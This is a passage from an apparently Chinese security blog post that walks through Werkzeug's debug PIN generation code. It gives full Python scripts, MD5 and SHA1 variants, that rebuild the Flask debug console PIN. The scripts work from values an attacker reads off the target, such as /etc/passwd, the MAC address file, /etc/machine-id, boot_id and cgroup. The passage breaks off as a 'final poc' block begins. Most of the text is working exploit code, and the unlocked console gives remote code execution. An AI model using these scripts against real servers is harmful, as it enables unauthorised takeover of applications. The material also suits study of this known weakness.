+<p>我们跟进get_pin_and_cookie_name看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: WSGIApplication,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>] | <span class="built_in">tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: <span class="built_in">str</span> | <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="comment"># Python &gt;= 3.13 only raises OSError</span></span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError, OSError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode()</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>
+
+<p>rv就是PIN码，看看这个rv怎么来的</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829172343751.png" alt="image-20250829172343751"></p>
+<p>先是从WERKZEUG_DEBUG_PIN环境变量中尝试获取pin，如果pin为off就返回空，如果pin存在就检测是否存在<code>-</code>分隔符，存在就直接赋值给rv，这是PIN码的分隔符<code>xxx-xxx-xxx</code>，如果没有分隔符就存入num后面进行格式化。</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829172416537.png" alt="image-20250829172416537"></p>
+<p>获取模块名modname以及当前用户名username、模块对象mod，这些会用于生成PIN和Cookie</p>
+<p>然后就来到了关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure>
+
+<p>定义了一个列表probably_public_bits和private_bits</p>
+<p>probably_public_bits列表</p>
+<ul>
+<li><code>username</code> → 当前系统用户名</li>
+<li><code>modname</code> → 应用模块名</li>
+<li><code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code> → 应用名称</li>
+<li><code>getattr(mod, &quot;__file__&quot;, None)</code> → 模块文件路径</li>
+</ul>
+<p>private_bits列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure>
+
+<p>额外加入 <strong>机器唯一标识</strong>：</p>
+<ol>
+<li><code>uuid.getnode()</code> → 获取 MAC 地址</li>
+<li><code>get_machine_id()</code> → 获取机器 ID（不同操作系统实现不同）</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:	<span class="comment">#如果为空就跳过</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):	<span class="comment">#如果是str类型就encode()转化成字节</span></span><br><span class="line">        bit = bit.encode()</span><br><span class="line">    h.update(bit)	<span class="comment">#将每个元素处理累加到哈希值h中</span></span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)	<span class="comment">#加入固定字节 &quot;cookiesalt&quot;</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span>	<span class="comment">#将 SHA1 哈希值转为十六进制字符串并取前20个字符作为cookie，前缀为__wzd</span></span><br></pre></td></tr></table></figure>
+
+<p>随后遍历这两个列表的元素，<code>isinstance()</code> 用于 <strong>判断一个对象是否属于某个类型或类型元组</strong>。</p>
+<p>继续看最后的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)<span class="comment">#再累加一层pinsalt</span></span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]<span class="comment">#将 SHA1 哈希的十六进制值转为整数转化成9位十进制数字并截取前面9位</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:<span class="comment">#尝试将 PIN 分组为 5 位、4 位、3 位</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:<span class="comment">#</span></span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>
+
+<p>这里就是主要的生成PIN码的部分，如果没有从环境变量中获取到PIN，就执行第一个if的操作，如果rv是空的，也就是没有接收到pin码，那就执行第二个if，也就是将num中的PIN码格式化处理一下，用<code>-</code>去连接</p>
+<p>例如</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="string">&quot;123456789&quot;</span></span><br><span class="line">group_size = <span class="number">3</span></span><br><span class="line"><span class="comment"># 分组结果: [&quot;123&quot;, &quot;456&quot;, &quot;789&quot;]</span></span><br><span class="line">rv = <span class="string">&quot;123-456-789&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>到这里pin码的生成原理我们就明白了，我们尝试写一个可以生成pin码的脚本</p>
+<p>需要的元素：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">username--&gt;getpass.getuser()	</span><br><span class="line"><span class="comment">#可通过文件读取linux可以查看/etc/passwd，windows可以查看C:/Users目录</span></span><br><span class="line"></span><br><span class="line">modname--&gt;<span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line"><span class="comment">#Flask 实例本身没有 __module__ 属性，所以取默认值为flask.app，这个写个测试代码return getattr(app, &quot;__module__&quot;, typing.cast(object, app).__class__.__module__)打印可以得出</span></span><br><span class="line"></span><br><span class="line">appname--&gt;<span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__)</span><br><span class="line"><span class="comment">#Flask 实例本身没有 __name__ 属性，所以取默认值Flask</span></span><br><span class="line"></span><br><span class="line">mod--&gt;sys.modules.get(modname)</span><br><span class="line">moddir--&gt;<span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="comment">#获取模块的文件路径，实际应用中通过报错读取</span></span><br><span class="line"></span><br><span class="line">uuid--&gt;uuid.getnode()</span><br><span class="line"><span class="comment">#通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</span></span><br><span class="line"></span><br><span class="line">machine_id--&gt;get_machine_id()</span><br><span class="line"><span class="comment">#每一个机器都会有自已唯一的id，</span></span><br><span class="line"><span class="comment">#1、/etc/machine-id（文件内容是 一个唯一的机器 ID）</span></span><br><span class="line"><span class="comment">#2、/proc/sys/kernel/random/boot_id</span></span><br><span class="line"><span class="comment">#3、/proc/self/cgroup</span></span><br><span class="line"><span class="comment">#docker环境读取后两个，非docker环境三个都要读取，读取结果合并就行</span></span><br></pre></td></tr></table></figure>
+
+<p>结合函数后面的算法，我们可以写一个脚本</p>
+<p>3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同</p>
+<p>md5的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = getpass.getuser()</span><br><span class="line">modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>,  app.__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modname)</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username,<span class="comment">#通过文件读取linux可以查看/etc/passwd，windows可以查看C:/Users目录</span></span><br><span class="line">    modname,<span class="comment">#默认值为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__module__),<span class="comment">#默认值Flask</span></span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),<span class="comment">#获取模块的文件路径，实际应用中通过报错读取</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mac =<span class="string">&#x27;xxxxxx&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#/sys/class/net/eth0/address获取mac地址</span></span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits =[</span><br><span class="line">    mac,</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="comment">#机器码</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&quot;__wzd&quot;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = (<span class="string">&quot;%09d&quot;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">    <span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>sha1的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">旧版计算PIN码#sha1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">username=<span class="string">&#x27;root&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">username = getpass.getuser()</span><br><span class="line">modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>,  app.__class__.__module__)</span><br><span class="line">mod = sys.modules.get(modname)</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username,<span class="comment">#通过文件读取linux可以查看/etc/passwd，windows可以查看C:/Users目录</span></span><br><span class="line">    modname,<span class="comment">#默认值为flask.app</span></span><br><span class="line">    <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__module__),<span class="comment">#默认值Flask</span></span><br><span class="line">    <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),<span class="comment">#获取模块的文件路径，实际应用中通过报错读取</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mac =<span class="string">&#x27;xxxxxx&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#/sys/class/net/eth0/address获取mac地址</span></span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits =[</span><br><span class="line">    mac,</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="comment">#机器码</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode()</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那我们挨个获取一下这些元素</p>
+<p>最终的poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 